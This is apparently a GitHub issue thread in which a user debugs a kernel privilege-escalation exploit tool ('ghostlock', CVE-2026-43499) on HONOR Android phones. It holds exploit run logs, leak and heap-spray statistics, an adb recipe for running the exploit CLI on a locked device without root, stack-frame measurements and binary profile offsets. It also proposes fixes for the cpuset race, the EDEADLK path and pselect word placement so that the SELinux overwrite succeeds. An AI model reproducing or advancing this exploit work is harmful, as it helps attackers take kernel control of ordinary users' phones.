body:
## Follow-up: the cpuset changes *between runs*, so ANY fixed CPU pair fails intermittently

Five consecutive runs, same device, same app build, same imported profile, and the **same CPU pair
(`main=6 consumer=7`) selected every time** — yet the `sched_setaffinity` failures come and go:

| run (log dir) | `sched_setaffinity` EINVAL count | leaks found | valid leaks | W1 attempts | exit |
|---|---|---|---|---|---|
| `20261010-151829` | **51** | 0 | 0 | 1 | 255 |
| `20261010-151907` | **0** | 4 | 0 | 2 | 1 |
| `20261010-151953` | **135** | 4 | **1** | 2 | 1 |
| `20261010-152038` | **0** | 2 | 0 | 1 | 137 |
| `20261010-152116` | **217** | 4 | 0 | 2 | 1 |

All five logs contain `cpu pair: main=6 consumer=7`.

### The app's cpuset is not stable across runs

Reading `Cpus_allowed_list` from the running app right after each launch gave a different set every time:

```
run 1 : Cpus_allowed_list:  0-3,5-6      <- CPU 7 missing
run 2 : Cpus_allowed_list:  0-5          <- CPU 6 and 7 both missing
run 3 : Cpus_allowed_list:  0-3,5,7      <- CPU 6 missing
run 4 : Cpus_allowed_list:  0-3,5,7
```

Earlier (first post) I sampled `0-3,6-7` after one launch and `2-3` after another, which fits the same
picture.

### Consequence

Because the affinity mask the exploit installs is built from the selected pair, and the process's cpuset can
move underneath it, `sched_setaffinity` returns `EINVAL` *whenever the pair happens to fall outside the
current cpuset*. That is exactly the correlation in the table: **EINVAL = 0 → the KernelSnitch leak works
(2–4 leaks per run); EINVAL > 0 → the leak always returns `0xffffffffffffffff`.** No CPU pair can be "correct"
in advance, because the allowed set is not fixed at run time.

So the fix probably is not "pick a better default pair" but one of:

* pin the exploit's threads into a cpuset the app controls before building the mask (or re-read
  `Cpus_allowed_list` immediately before each `sched_setaffinity` and clip the mask to it), and/or
* have the CPU picker filter its choices to the current `Cpus_allowed_list` and re-validate just before the
  run, warning if the chosen pair has become unavailable.

That would also make this device behave the way the app claims it does ("Supported / Profile ready" but the
exploit cannot work because a syscall silently fails).

### Evidence attached

* `MAGIC7-SWEEP-5RUNS/` — the five exported logs above, plus `profile.conf` / `profile.bin` for each
* each log shows the full `debug.execution.*` preset dump, so the tunables are identical across runs

If it helps, I can also log `Cpus_allowed_list` immediately before and after each
`sched_setaffinity` call using a small wrapper, or run a longer series to give you a failure rate.

[7-ATTACH-sweep-5runs.zip](https://github.com/user-attachments/files/33281608/7-ATTACH-sweep-5runs.zip)

## Follow-up 2 — the CLI path already has the cpuset fallback (the app path does not), and it still ends at `prepare_kernel_page`

This is the most useful thing I found today, and it splits into two parts.

### 1. The CLI warns and falls back; the app path does not

Running the same profile through the standalone CLI (which executes as `shell`, cpuset `0-7`) prints an extra
line the app path never shows, then silently corrects the CPU pair:

```
[*] kernel: 5.10.252-android12-9-00009-gf960ed27302b-ab15212796
[+] resolved profile loaded: 5.10.252-android12-9-00009-gf960ed27302b-ab15212796
[-] profile cores 6/7 not in allowed cpuset          <-- only on the CLI path
[*] cpu pair: main=0 consumer=1                      <-- automatic fallback
[*] debug.execution.recommended_cpus.main=6
[*] debug.execution.recommended_cpus.consumer=7
[*] debug.execution.selected_cpus.main=0             <-- selected != recommended
[*] main thread running on cpu=0
```

Result over four consecutive CLI runs — **`sched_setaffinity` EINVAL count: 0 in every run**:

| run | shell `Cpus_allowed_list` | EINVAL | leaks found | valid leaks | route lines |
|---|---|---|---|---|---|
| 1 | `0-7` | **0** | 4 | **1** (`0xffffff8026348000`) | 9 |
| 2 | `0-7` | **0** | 4 | 0 | 9 |
| 3 | `0-7` | **0** | 4 | 0 | 9 |
| 4 | `0-7` | **0** | 4 | 0 | 9 |

Compare with the app path on this same device and profile: EINVAL counts of 51, 135 and 217, and every leak
returning `0xffffffffffffffff` (see the previous comment, and `MAGIC7-CPU45-EINVAL.log.txt`). **So the cpuset
check exists in one code path and not the other.** Making the app path do what the CLI path already does —
detect that the selected pair is outside `Cpus_allowed_list`, fall back, and say so in the log — would fix the
KernelSnitch failure on this device with no geometry changes.

Worth noting the CLI can be driven on a device whose kernel is not in the bundled list by exporting the app's
own compiled profile: `ghostlock-cli --load-prebuilt-profile <app>/files/…/profile.bin` (the `.conf` is
rejected with `[!] cannot load profile`).

### 2. With EINVAL gone, the run still ends at `prepare_kernel_page`

The run that did produce a valid `mm_struct` went straight into the same rejection reported for the other
device in #372:

```
[*] [spray] mm_struct leaked=0xffffff8026348000 +...ms
[*] [spray] payload ready +1864ms
[-] page ffffff8026348000 stores an even byte over selinux_state.initialized; taking another
[-] prepare_kernel_page retry 4/4 +19563ms
[-]   heap spray failed
[-] W1: SELinux attempt 1 route failed; backing off
[-] Write 1 failed
```

Leak success across the four CLI runs was 1 valid address out of 16 spray attempts (6%). In the three runs
where no valid address appeared, the four `prepare_kernel_page` attempts were all `KernelSnitch mm_struct leak
failed` instead.

### Why I think this matters more than the CPU pair

Both devices I have access to now fail at the *same* check:

* HONOR 400 Smart, `6.1.99`, `tcp_zerocopy` → `prepare_kernel_page` even-byte rejection, then a route-stage
  panic (issue #372)
* HONOR Magic7 Lite, `5.10.252`, `multicast_waiter` → `prepare_kernel_page` even-byte rejection, no panic

That is two different SoCs, two kernel versions and two different routes hitting the same
`selinux_state.initialized` check, which makes it look like a shared root cause rather than two device quirks.
If the candidate page keeps being rejected, the leak hit-rate is almost secondary.

### Files attached

* `M7-CLI-4RUNS/` — the four streamed CLI logs (84/83/83/83 lines) plus the profile used
* the app-path logs from the previous comment, for the EINVAL comparison

Happy to run more CLI series (I can do 10–20 back to back) to give a leak success rate, or to try candidate
`offset.selinux_enforcing` values if you can say which field `prepare_kernel_page` is actually testing.

[8-ATTACH-CLI-4RUNS.zip](https://github.com/user-attachments/files/33285872/8-ATTACH-CLI-4RUNS.zip)

## CONFIRMED ROOT CAUSE — `CMP_REQUEUE_PI` returns `EDEADLK`, the PI chain is never armed, and every route then fails with errno 99 / a panic

Two independent captures now, on the same `multicast_waiter` device, plus the `tcp_zerocopy` device. This is
the important comment.

### Capture A — `M7-CLI-run3.log`

```
[*] [spray] mm_struct leaked=0xffffff80219ff800 +2028ms       <-- VALID
[*] [spray] payload ready +2030ms
[*] prepare_kernel_page ok attempt=1 +2247ms                  <-- PASSED
[*] [T+2499ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=1
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
   >>> log ends; device rebooted
```

### Capture B — `M7-CLI-run4-BREAKTHROUGH.log` (this is the decisive one)

```
[+] startup context pid=14316 uid=2000 euid=2000 ... attr=u:r:shell:s0 enforce=1
[+] startup limits pid=14316 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[*] [T+0ms] pre-W1 drain
[*] W1: SELinux attempt 1/1
[*] === W1: SELinux === target=0xffffff802aa53b98 mode=1 leaf=0
[*] [T+242ms]   heap spray start
[*] [spray] mm_struct leaked=0xffffffffffffffff +6171ms       <-- spray 1 failed
[-] prepare_kernel_page retry 1/4 +6416ms
[*] [spray] mm_struct leaked=0xffffff8055813c00 +1939ms       <-- spray 2 VALID
[*] [spray] payload ready +1941ms
[*] prepare_kernel_page ok attempt=2 +8589ms                  <-- PASSED
[*] [T+8831ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] multicast route status=2 clean=1/1 step=61 errno=99       <-- errno 99 = EADDRNOTAVAIL
```

### What the two captures together show

The full chain is:

```
CMP_REQUEUE_PI -> -1 / errno 35 (EDEADLK)
        |
        +-- PI chain never armed (rt_mutex_start_proxy_lock() is never reached,
        |   because futex_requeue_pi takes "goto out_unlock" on the EDEADLK branch)
        |
        +-- route then fails with a *different* errno:
        |      multicast_waiter : status=2 clean=1/1 step=61 errno=99  (EADDRNOTAVAIL)
        |      tcp_zerocopy     : reports success=1 clean=1/1 errno=0 but the write never lands
        |
        +-- no W2 ever appears in any log from either device
        |
        +-- run ends in a kernel panic / reboot
```

Six things make this conclusive rather than a symptom:

1. **Everything upstream is verified good.** Valid `mm_struct` leak
   (`0xffffff80219ff800`, `0xffffff8055813c00`), `prepare_kernel_page ok`, `heap spray done`,
   `payload ready`, on the correct CPU pair, with `Seccomp=0` and `shell` context.
2. **It is route-independent.** `multicast_waiter` (5.10.252) and `tcp_zerocopy` (6.1.99) both show
   `CMP_REQUEUE_PI ret=-1 errno=35` immediately after `waiter parked; owner started`.
3. **It is kernel-independent.** `5.10.252-android12-9` and `6.1.99-android14-11` both reproduce it, so it is
   not a per-kernel geometry problem. Every geometry field needed to reach this point verified correct on both
   devices.
4. **It is the first thing that fails in the route stage**, before any route-specific work in either route.
5. **The route then fails downstream in a way that is consistent with an unarmed chain** — either a distinct
   errno (99) or a "success" report followed by no visible effect at all.
6. **`errno 35` is a documented, deliberate kernel answer**, not a crash: `futex_requeue_pi()` returns
   `-EDEADLK` when `(uval & FUTEX_TID_MASK) == vpid`, i.e. when the word at `*uaddr2` holds the TID of the
   thread doing the requeue. That is exactly the "requeue onto a lock I already hold" case.

### Where the fix belongs

The precondition that is not holding is the userspace lock word at `*uaddr2` at the moment of the syscall. On
both kernels the failing value is consistent with that word still holding the **waiter's** TID rather than the
**owner's** (or `FUTEX_OWNER_DIED | owner_tid`). So:

1. Make the requeue wait until the owner has actually acquired the mutex, and/or retry on `EDEADLK` instead of
   treating it as fatal. `tcp_zerocopy` currently accepts the failure and reports `success=1`, which makes the
   run look healthy while the chain is unarmed — a false positive that then panics.
2. Consider whether the holder word needs `FUTEX_OWNER_DIED` set for these kernels.
3. If a route cannot proceed, abandon it *before* the spray rather than continuing with an unarmed PI chain;
   the panic in every failing run comes after this point.

### Reproduction recipe (works on a locked device, no root)

```
adb push ghostlock-cli-arm64 /data/local/tmp/ghostlock-cli && adb shell chmod 755 /data/local/tmp/ghostlock-cli
# export the app's own compiled profile from its debug dir, then:
adb shell /data/local/tmp/ghostlock-cli --load-prebuilt-profile /data/local/tmp/profile.bin
```

Streaming the CLI's stdout (rather than letting the app write the log at the end) is what made these captures
possible — the app path loses the log to the panic, the CLI path does not.

### Statistics from 70 recorded runs on the Magic7 Lite (three series)

| metric | result |
|---|---|
| runs reaching the route stage | **6 / 70 (~9%)** |
| valid `mm_struct` leaks | 10 / 70 (~14%) |
| `prepare_kernel_page ok` | 4 / 70 (~6%) |
| **runs printing `CMP_REQUEUE_PI … errno=35`** | **6 / 6 route-stage runs (100%)** |
| **runs printing `multicast route … errno=99`** | **6 / 6 route-stage runs (100%)** |
| runs lost to a panic / reboot | ~25% |
| runs with `sched_setaffinity` EINVAL > 0 | 9 / 70 (~13%, the cpuset race) |

Every single run that reached the route stage printed `CMP_REQUEUE_PI ret=-1 errno=35`. Three independent
captures of the full down-stream failure (`multicast route status=2 clean=1/1 step=61 errno=99`) were obtained
in different series, so the failure is deterministic rather than flaky. A runner that reconnects after each
reboot was needed to collect this — roughly one run in four panics the device.

### Files attached

* `M7-CLI-run4-BREAKTHROUGH.log` — capture B, the decisive one (`multicast route status=2 … errno=99`)
* `M7-CLI-run3-BREAKTHROUGH.log` — capture A
* `M7-CLI-4RUNS.zip` — four earlier CLI runs
* `RUN-051701-FULL.log.txt`, `RUN-050906-FULL.log.txt` (issue #372) — the 400 Smart `tcp_zerocopy` runs with
  the same `EDEADLK` and the `success=1` false positive

[13-ATTACH-BREAKTHROUGH-5RUNS.zip](https://github.com/user-attachments/files/33285942/13-ATTACH-BREAKTHROUGH-5RUNS.zip)

# MAGIC 7 LITE — ROUTE INVESTIGATION RESULTS (2026-10-11)

## What changed today

The route was the wrong one. `multicast_waiter` cannot complete on this kernel, and the replacement
(`tcp_zerocopy`) fails differently. Full data below.

---

## 1. Correction to my earlier analysis

`CMP_REQUEUE_PI ret=-1 errno=35` is **expected**, not the bug. From the original NebuSec write-up
(<https://nebusec.ai/buglist/CVE-2026-43499/>):

> "When the proxy enqueue hits `-EDEADLK` and rolls back, `remove_waiter()` dequeues the waiter from the
> lock but scrubs `pi_blocked_on` on the wrong task."
>
> "Reaching the rollback needs a PI dependency cycle across three futex words and three threads
> (`waiter -> f_pi_target -> owner -> f_pi_chain -> waiter`), which closes on its own once staged."

So every route-stage run on this device printing `errno=35` was behaving correctly. My earlier
"root cause" comments in issue #382 are wrong on that point and should be disregarded.

---

## 2. Route encoding (discovered from the compiled profile headers)

```
21 07 00 0d 02 00 01 00 01 00 [XX 00] <len> <release string>
                                ^^^^^
                                route selector
```

| value | route |
|---|---|
| `01` | `select_stack` |
| `02` | **`tcp_zerocopy`** |
| `03` | `multicast_waiter` |

The extractor can also emit a profile for a chosen route directly:

```
ghostlock-extract boot.img --format conf --route tcp_zerocopy
ghostlock-extract boot.img --format conf --route select_stack
```

---

## 3. Result with `multicast_waiter` (the original suggestion)

```
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done     <- expected
[*] multicast route status=2 clean=1/1 step=61 errno=99            <- EADDRNOTAVAIL
```

`errno 99` while the network state is healthy:

```
wlan0 : 192.168.70.149/24  <BROADCAST,MULTICAST,UP,LOWER_UP>
lo    : 127.0.0.1/8 and ::1/128
ipv6  : /proc/sys/net/ipv6/conf/all/disable_ipv6 = 0
route : 192.168.70.0/24 dev wlan0 proto kernel scope link src 192.168.70.149
```

**5 of 5 route-stage runs ended this way.**

---

## 4. Result with `tcp_zerocopy` (built and tested today)

Profile regenerated with `--route tcp_zerocopy`, imported in the app, verified:

```
compiled profile.bin:  21 07 00 0d 02 00 01 00 01 00 [01 00] 33 00 00 00
                                                      ^^^^^ tcp_zerocopy

CLI: debug.execution.routes.tcp_zerocopy.attempts=2000
     debug.execution.routes.tcp_zerocopy.arm_sequence=16
     debug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
```

The route then ran and failed **every single attempt**:

```
[*] tcp route seq=1    ret=-1 errno=22 len=40 calls=0 success=0
[*] tcp route seq=2    ret=-1 errno=22 len=40 calls=0 success=0
                    ... (2000 attempts, identical) ...
[*] tcp route seq=2000 ret=-1 errno=22 len=40 calls=0 success=0
[*] tcp route done=0 calls=0 success=0 status=2 clean=1/1 step=45 errno=0
[*] [route] route_done status=2 clean=1/1 step=45 errno=0 calls=0 success=0
[*] [route] threads joined
[*] [T+471023ms]   PI route done
[-]   PI route did not produce a verified write
```

**`errno 22` = `EINVAL` on `TCP_ZEROCOPY_RECEIVE`, 2000 out of 2000 attempts, with `len=40`.**

Note the kernel ABI difference: on 5.10 `struct tcp_zerocopy_receive` is 16 bytes
(`address`, `length`, `recv_skip_hint`), while on 6.1 — where this route works on the HONOR 400 Smart —
it is 64 bytes (`inq`, `err`, `copybuf_address`, `copybuf_len`, `flags`, `msg_control`, …). The route
passes `len=40`.

---

## 5. `compact_waiter = 0` is rejected by the schema

Tried as the obvious 5.10-vs-6.1 knob:

```
route { tcp_zerocopy { compact_waiter = 0 } }   ->  app: "Profile needs correction"
```

Only `compact_waiter = 1` validates, and that is the value that produced the 2000 `EINVAL` results above.

---

## 6. Where that leaves the three routes on this kernel

| route | result on 5.10.252 |
|---|---|
| `multicast_waiter` | `errno=99` (`EADDRNOTAVAIL`) at `step=61`, 5/5 runs |
| `tcp_zerocopy` | `errno=22` (`EINVAL`) 2000/2000 attempts at `step=45` |
| `select_stack` | not tried — extractor reports `pselect_waiter_shift unavailable; no family fallback is defined for this release` |

---

## 7. Device state to restore

The app is currently showing **"Profile needs correction / Correct the marked fields"** because the
invalid `compact_waiter = 0` profile was loaded last. To restore the earlier working state, import the
original profile again (`magic7-multicast-v3.conf` / `tcproute.txt`) — the app then shows
**"Supported / Profile ready"** as before.

Files on the device: `/sdcard/Download/tcproute.txt`, `m7-tcproute.conf`, `magic7-multicast-v3.conf`.
(The invalid `tcproute-cw0.*` was removed.)

---

## 8. What a maintainer could answer in one line

* Is `tcp_zerocopy` supported on a 5.10 GKI kernel, or is it 6.x-only? The `len=40` vs 16/64-byte
  `tcp_zerocopy_receive` ABI would explain a constant `EINVAL`.
* Is `multicast_waiter` expected to work without a specific interface setup? It reaches `step=61` and
  returns `EADDRNOTAVAIL` on a device with a healthy `wlan0`.
* Is `select_stack` viable here given `pselect_waiter_shift` cannot be derived for this release?

Any one of those answers tells us which profile to build next.

## Research follow-up: `do_futex` is NOT inlined here, and the futex/pselect stack gap is only **0x40**

I measured this kernel from its non-stripped `vmlinux.elf` (143,316 symbols) to find out *why* the routes behave as they do. The result is more encouraging than I expected. Numbers below, and one specific question at the end.

---

### 1. `do_futex` is not inlined on this kernel

The [vivo Y200i report for 5.10.218 GKI](https://github.com/anksgls-sj/-Help-vivo-Y200i-5.10.218-GKI-CVE-2026-43499-stack-reclaim-reaches-0x300-need-0x318) establishes the pattern: when `do_futex` is not inlined the futex stack frame is deeper, the pselect window falls short of the `rt_mutex_waiter`, and the stack-reclaim cannot reach it. Their kernel is that case and they abandoned it; PFEM10 (`5.10.236`, Clang 12.0.5) has it inlined and works.

Measured on this device's `vmlinux.elf`:

```
__arm64_sys_futex +0x0ac:   BL 0xffffffc008292c84  ->  do_futex
```

So `do_futex` is **NOT inlined** here — the same class as the vivo Y200i.

### 2. Frame sizes, measured from the prologue instructions

| function | this device (5.10.252) | vivo Y200i (5.10.218) |
|---|---|---|
| `__arm64_sys_futex` | `0x90` | `0xe0` |
| `do_futex` | `0x70` | `0xc0` |
| `futex_wait_requeue_pi` | `0x1a0` | `0x1b0` |
| **futex chain total** | **`0x2a0`** | **`0x330`** |
| `__arm64_sys_pselect6` | `0xa0` | `0xa0` |
| `core_sys_select` | `0x1c0` | `0x1c0` |
| **pselect chain total** | **`0x260`** | `0x260` |
| **gap (futex − pselect)** | **`0x40` (64 bytes)** | **`0x120` (288 bytes)** |

Also measured: `futex_wait` `0x130`, `futex_requeue` `0x120`, `do_sys_poll` `0x3a0`, `__arm64_sys_poll` `0x60`, `__arm64_sys_rt_sigreturn` `0x50`.

**Our gap is 4.5× smaller than the device that was written off as "architecturally non-overlapping".** So frame layout alone does not rule out `select_stack` on this device.

### 3. What `select_stack` reports here

With a valid leak and `prepare_kernel_page ok`, the route stage is reached in under a second:

```
[*] [spray] mm_struct leaked=0xffffff802ab93c00 +790ms      <- VALID
[*] prepare_kernel_page ok attempt=1 +882ms                 <- PASSED
[*] [T+994ms]   heap spray done
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done   <- expected trigger
[-] pselect cannot place task       waiter_word=12 global_word=15 words_per_set=5 nfds=320
[-] pselect cannot place lock       waiter_word=13 global_word=16 words_per_set=5 nfds=320
[-] pselect cannot place wake_state waiter_word=14 global_word=17 words_per_set=5 nfds=320
[*] pselect route setup shift=3 page=ffffff802ab90000 fake_lock=ffffff802ab90000 fake_w0=ffffff802ab90300 fake_task=ffffff802ab90400
[*] pselect pre-select attempt=1/1 compact=0 +0ms
```

With `waiter_shift = 1` the same route reports only the wake_state failure:

```
[-] pselect cannot place wake_state waiter_word=14 global_word=15 words_per_set=5 nfds=320
[*] pselect route setup shift=1 ...
```

So `global_word = waiter_word + shift` (verified across both runs), and **`shift = 1` is better than `3` here** — with `1`, task and lock placed successfully and only wake_state failed.

### 4. The question

The three words need to sit at indices **12, 13, 14**, but `words_per_set = 5` (`nfds = 320`, `320 / 64 = 5`). Changing `waiter_shift` moves `global_word` but not `waiter_word`, so no shift value brings 12..14 into range.

* Is there a profile field for the fd layout / `nfds` — i.e. can `nfds` be raised to ≥ 960 so `words_per_set ≥ 15` — or is `nfds` derived internally?
* Or, on a non-inlined kernel, should the placement rule / `waiter_shift` semantics be adjusted so the words land inside the available set?
* Is there another route or stack-reclaim primitive that suits a kernel with a `0x40` gap?

### 5. Why this device may be worth a look

| route | result here |
|---|---|
| `multicast_waiter` | `errno=99` (`EADDRNOTAVAIL`) at `step=61`, 5/5 runs — network is healthy (`wlan0` UP + MULTICAST, IPv6 on) |
| `tcp_zerocopy` | `errno=22` (`EINVAL`) on all 2000 attempts with `len=40`. Note 5.10's `tcp_zerocopy_receive` is 16 bytes whereas 6.1's (where this route works, on a 400 Smart) is 64 bytes |
| `select_stack` | reaches the pselect stage in **994 ms** with valid leak + `prepare_kernel_page ok`; fails only the word placement above |

`select_stack` is the only one of the three whose failure is a geometry value rather than a network or ABI mismatch, and its gap is the smallest reported so far.

### 6. Verifying the measurements

The profile is the one built from this kernel's own symbols, imported in the app, then run through the CLI's `--load-prebuilt-profile` with streamed stdout so the log survives. The compiled `profile.bin` is a length-prefixed key/value format — e.g. `waiter_shift` has its key length byte (`0c` = 12) at offset 1811, the key at 1812, and its 8-byte little-endian value at 1824 — which is how the two shift values above were tested without another app round-trip.

Attached: the two select_stack logs, the two helper scripts (the `BL` scan that proved `do_futex` is not inlined, and the prologue decoder that produced the frame table), and the three-route comparison.

The non-stripped `vmlinux.elf` for this kernel (143,316 symbols) is also available — the vivo Y200i report lists exactly that as something they were missing, so it may help there too.

[ZIP-M7-research-evidence.zip](https://github.com/user-attachments/files/33296844/ZIP-M7-research-evidence.zip)
